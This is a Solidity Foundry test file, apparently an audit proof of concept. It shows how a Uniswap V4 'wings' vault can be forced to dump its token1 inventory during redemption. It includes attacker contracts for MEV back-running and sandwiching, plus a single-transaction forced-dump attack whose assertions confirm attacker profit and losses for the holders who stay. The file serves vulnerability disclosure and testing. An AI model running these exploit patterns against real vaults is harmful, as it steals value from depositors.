// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance as Rebalance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultInventory as Inventory} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultInventory.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultTypes as Types} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultTypes.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor as Actor} from "./PoolActor.sol";

/// @notice Unprivileged MEV searcher. Owns its own pool actor; capital is minted to it and fully accounted.
contract Searcher {
    Actor public actor;
    constructor(IPoolManager pool_) { actor = new Actor(pool_, address(this)); }
    function swapTo(PoolKey memory key_, bool zeroForOne_, uint160 limit_) external {
        actor.swapTo(key_, zeroForOne_, 1e21, limit_);
    }
}

/// @notice Self-contained forced dump: deposit, permissionless rebalance (moves cash into core),
///         redeem everything (forces core close + whole opposing-balance dump), back-run to fair price. One tx.
contract ForcedDumper {
    Actor public actor;
    constructor(IPoolManager pool_) { actor = new Actor(pool_, address(this)); }
    function run(PoolKey memory key_, address vault_, IERC20 t0_, uint256 deposit_, uint8 rebalances_, uint160 fair_)
        external returns (uint256 redeemed_)
    {
        t0_.approve(vault_, type(uint256).max);uint256 shares = IStandardExchangeIn(vault_).exchangeIn(t0_, deposit_, IERC20(vault_), 0, address(this), false, block.timestamp);
        for (uint8 i; i < rebalances_; ++i) {
            try Rebalance(vault_).rebalance(0, block.timestamp) {} catch { break; }
        }redeemed_ = IStandardExchangeIn(vault_).exchangeIn(IERC20(vault_), shares, t0_, 0, address(this), false, block.timestamp);
        actor.swapTo(key_, true, 1e21, fair_);
    }
}

contract WingsRedeemDumpTest is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;
    Actor internal externalLp;
    address internal redeemer;   // honest large holder exiting
    address internal holder;     // honest holder who stays (the victim)
    uint160 internal p0;

    function setUp() public virtual override {
        super.setUp();
        vm.prank(owner); indexedexManager.setDefaultLiquidReservePercentage(0.2e18);
        externalLp = Actor(create3Factory.create3WithArgs(type(Actor).creationCode, abi.encode(pool, address(this)), keccak256("Apex.externalLp")));
        token0.mint(address(externalLp), 1e25); token1.mint(address(externalLp), 1e25);
        externalLp.modify(key, -887220, 887220, int256(uint256(1e18)), bytes32(0)); // external full-range depth
        redeemer = makeAddr("redeemer");
        holder = makeAddr("holder");
    }

    function _deposit(address who, uint256 amount) internal {
        token0.mint(who, amount);
        vm.startPrank(who);
        token0.approve(address(wings0), type(uint256).max);IStandardExchangeIn(address(wings0)).exchangeIn(token0, amount, IERC20(address(wings0)), 0, who, false, block.timestamp);
        vm.stopPrank();
    }

    function _seed(uint256 redeemerDeposit, uint256 holderDeposit) internal {
        _deposit(redeemer, redeemerDeposit);
        _deposit(holder, holderDeposit);
        address keeper = makeAddr("keeper");
        for (uint256 i; i < 6; ++i) {
            vm.prank(keeper);
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) {} catch { break; }
        }
        // external arbitrage returns the pool to the fair external price (1.0 raw); honest keeper maintains
        for (uint256 j; j < 3; ++j) {
            _arbToFair();
            vm.prank(keeper);
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) {} catch {}
        }
        _arbToFair();
        (p0,,,) = pool.getSlot0(key.toId());
        require(p0 == uint160(1) << 96, "fair");
    }
    function _arbToFair() internal {
        (uint160 pc,,,) = pool.getSlot0(key.toId());
        uint160 fair = uint160(1) << 96;
        if (pc < fair) externalLp.swapTo(key, false, 1e24, fair);
        else if (pc > fair) externalLp.swapTo(key, true, 1e24, fair);
    }

    function _val(uint256 a0, uint256 a1) internal view returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(a0, p0, 1 << 96), p0, 1 << 96) + a1;
    }

    /// Fair mark-to-market of the whole vault at p0 (locals + principal of all positions at current pool price).
    function _vaultMark() internal view returns (uint256 m0, uint256 m1) {
        (m0, m1) = wings0.localReserves();
        (uint160 price,,,) = pool.getSlot0(key.toId());
        for (uint8 i; i < 3; ++i) {
            (int24 lo, int24 up, uint128 liq,) = wings0.position(i);
            if (liq == 0) continue;
            Types.Principal memory p = Inventory.principal(price, lo, up, liq, false);
            m0 += p.amount0; m1 += p.amount1;
        }
    }

    struct R {
        int256 profit; uint256 paid; uint256 markBefore; uint256 markAfter; uint256 holderBefore; uint256 holderAfter;
        uint256 liqBefore; uint256 liqAfter; bool redeemOk;
    }

    /// Searcher front-runs (optional, frontTicks>0 pushes price up = same direction as vault's token1->token0 dump),
    /// honest redeemer redeems `shares` with 1% slippage vs the un-manipulated quote, searcher back-runs to p0.
    function _markVal() internal view returns (uint256) { (uint256 m0, uint256 m1) = _vaultMark(); return _val(m0, m1); }
    function _holderMark(uint256 mark) internal view returns (uint256) {
        return FullMath.mulDiv(mark, IERC20(address(wings0)).balanceOf(holder), IERC20(address(wings0)).totalSupply());
    }
    function _actorVal(address a) internal view returns (int256) { return int256(_val(token0.balanceOf(a), token1.balanceOf(a))); }
    function _doRedeem(uint256 shares, uint256 minimum, R memory r) internal {
        uint256 b = token0.balanceOf(redeemer);
        vm.prank(redeemer);try IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(wings0)), shares, token0, minimum, redeemer, false, block.timestamp) returns (uint256) {
            r.redeemOk = true;
        } catch (bytes memory err) { console2.log("redeem reverted"); console2.logBytes(err); }
        r.paid = token0.balanceOf(redeemer) - b;
        (uint160 pm,,,) = pool.getSlot0(key.toId());
        console2.log("  price after redeem (sqrtX96)", pm, "p0", p0);
    }
    function _restore(Searcher s) internal {
        (uint160 pNow,,,) = pool.getSlot0(key.toId());
        if (pNow > p0) s.swapTo(key, true, p0); else if (pNow < p0) s.swapTo(key, false, p0);
        (pNow,,,) = pool.getSlot0(key.toId());
        require(pNow == p0, "not restored");
    }
    function _logR(int24 frontTicks, R memory r) internal pure {
        console2.log("front ticks", frontTicks);
        console2.log("  redeem ok", r.redeemOk);
        console2.log("  redeemer paid (token0 raw)", r.paid);
        console2.log("  searcher profit @p0 (raw)", r.profit);
        console2.log("  vault mark before / after", r.markBefore, r.markAfter);
        console2.log("  remaining-holder mark before / after", r.holderBefore, r.holderAfter);
        console2.log("  liquidationValue before / after", r.liqBefore, r.liqAfter);
    }

    /// Searcher front-runs (optional, frontTicks>0 pushes price up = same direction as vault's token1->token0 dump),
    /// honest redeemer redeems `shares` with 1% slippage vs the un-manipulated quote, searcher back-runs to p0.
    function _sandwich(uint256 shares, int24 frontTicks) internal returns (R memory r) {
        uint256 snap = vm.snapshotState();
        Searcher s = new Searcher(pool);
        address a = address(s.actor());
        token0.mint(a, 1e21); token1.mint(a, 1e21);
        int256 v0 = _actorVal(a);
        r.liqBefore = wings0.liquidationValue().value;
        uint256 minimum = FullMath.mulDiv(r.liqBefore, shares, IERC20(address(wings0)).totalSupply()) * 99 / 100;
        r.markBefore = _markVal();
        r.holderBefore = _holderMark(r.markBefore);
        if (frontTicks > 0) s.swapTo(key, false, TickMath.getSqrtPriceAtTick(TickMath.getTickAtSqrtPrice(p0) + frontTicks));
        _doRedeem(shares, minimum, r);
        _restore(s);
        r.profit = _actorVal(a) - v0;
        r.markAfter = _markVal();
        r.holderAfter = _holderMark(r.markAfter);
        r.liqAfter = wings0.liquidationValue().value;
        _logR(frontTicks, r);
        vm.revertToState(snap);
    }

    function _logSeed() internal view {
        console2.log("redeemer shares / supply", IERC20(address(wings0)).balanceOf(redeemer), IERC20(address(wings0)).totalSupply());
        (uint256 l0, uint256 l1) = wings0.localReserves();
        console2.log("local0/local1", l0, l1);
        (,, uint128 c,) = wings0.position(0); console2.log("core liq", c);
        (,, c,) = wings0.position(1); console2.log("upper liq", c);
        (,, c,) = wings0.position(2); console2.log("lower liq", c);
    }

    function test_sweepRedeemSandwich() public {
        uint256[2] memory extra = [uint256(0), 2e18];
        for (uint256 d; d < 2; ++d) {
            uint256 snap0 = vm.snapshotState();
            if (extra[d] != 0) externalLp.modify(key, -887220, 887220, int256(extra[d]), bytes32(uint256(7)));
            console2.log("===== external full-range L", 1e18 + extra[d]);
            _seed(2e17, 1e17);
            _logSeed();
            uint256 sh = IERC20(address(wings0)).balanceOf(redeemer);
            int24[4] memory fronts = [int24(0), 100, 200, 300];
            for (uint256 i; i < fronts.length; ++i) _sandwich(sh, fronts[i]);
            _sandwich(sh * 3 / 4, 0);
            _sandwich(sh / 2, 0);
            vm.revertToState(snap0);
        }
    }

    /// PoC A: an honest holder's full exit (66% of supply) forces the vault to close its core and dump its ENTIRE
    /// token1 inventory at a MIN/MAX price limit even though only a small target shortfall exists. Any searcher
    /// back-runs the dislocated pool; the staying holder loses fair value. Contrast: a 50% exit (no dump) gives the
    /// staying holder a gain.
    function test_PoC_redeemForcedDumpBackrun() public {
        _seed(2e17, 1e17);
        _logSeed();
        uint256 sh = IERC20(address(wings0)).balanceOf(redeemer);
        R memory full = _sandwich(sh, 0);
        R memory sand = _sandwich(sh, 200);
        R memory part = _sandwich(sh * 3 / 4, 0);
        assertTrue(full.redeemOk && sand.redeemOk && part.redeemOk);
        // searcher: capital fully returned, positive profit valued at the fair (restored) price
        assertGt(full.profit, 0, "searcher back-run profit");
        assertGt(sand.profit, full.profit, "front-run within victim's 1% slippage adds profit");
        // staying holder loses fair value only in the forced-dump path
        assertLt(full.holderAfter, full.holderBefore, "staying holder lost value");
        assertLt(sand.holderAfter, full.holderAfter, "sandwich deepens loss");
        assertGt(part.holderAfter, part.holderBefore, "control: non-dump exit does not hurt staying holder");
        console2.log("RESULT backrun profit", full.profit);
        console2.log("RESULT sandwich profit", sand.profit);
        console2.log("RESULT staying-holder loss (backrun)", full.holderBefore - full.holderAfter);
        console2.log("RESULT staying-holder loss (sandwich)", sand.holderBefore - sand.holderAfter);
        console2.log("RESULT staying-holder loss bps (sandwich)", (sand.holderBefore - sand.holderAfter) * 10000 / sand.holderBefore);
    }

    /// PoC B: attacker-forced variant in a single tx, no pre-existing shares. Attacker capital is minted to its
    /// contract and must come back with a profit.
    function test_PoC_forcedDumpSelfTriggered() public {
        _deposit(holder, 1e17);
        address keeper = makeAddr("keeper");
        for (uint256 i; i < 6; ++i) { vm.prank(keeper); try Rebalance(address(wings0)).rebalance(0, block.timestamp) {} catch { break; } }
        for (uint256 j; j < 3; ++j) { _arbToFair(); vm.prank(keeper); try Rebalance(address(wings0)).rebalance(0, block.timestamp) {} catch {} }
        _arbToFair();
        (p0,,,) = pool.getSlot0(key.toId());
        uint256[4] memory sizes = [uint256(1e17), 2e17, 4e17, 8e17];
        bool ran;
        for (uint256 k; k < 4; ++k) {
            for (uint8 rb = 1; rb <= 3; rb += 2) {
                uint256 snap = vm.snapshotState();
                uint256 hBefore = _holderMark(_markVal());
                ForcedDumper f = new ForcedDumper(pool);
                address a = address(f.actor());
                token0.mint(address(f), sizes[k]);
                token0.mint(a, 1e21); token1.mint(a, 1e21);
                int256 v0 = _actorVal(a) + _actorVal(address(f));
                try f.run(key, address(wings0), token0, sizes[k], rb, p0) {
                    { (uint160 pe,,,) = pool.getSlot0(key.toId()); assertEq(pe, p0, "price restored to fair"); }
                    assertEq(IERC20(address(wings0)).balanceOf(address(f)), 0, "attacker holds no residual shares");
                    int256 pr = _actorVal(a) + _actorVal(address(f)) - v0;
                    console2.log("deposit", sizes[k], "rebalances", rb);
                    console2.log("  attacker net @fair", pr);
                    uint256 hAfter = _holderMark(_markVal());
                    console2.log("  holder mark before/after", hBefore, hAfter);
                    if (sizes[k] == 2e17 && rb == 1) {
                        assertGt(pr, 0, "self-triggered attacker profit");
                        assertLt(hAfter, hBefore, "staying holder loss");
                        console2.log("RESULT self-triggered attacker profit", pr);
                        console2.log("RESULT self-triggered holder loss", hBefore - hAfter);
                        ran = true;
                    }
                } catch (bytes memory e) { console2.log("run reverted", sizes[k], rb); console2.logBytes(e); }
                vm.revertToState(snap);
            }
        }
        assertTrue(ran, "asserting scenario ran");
    }
}
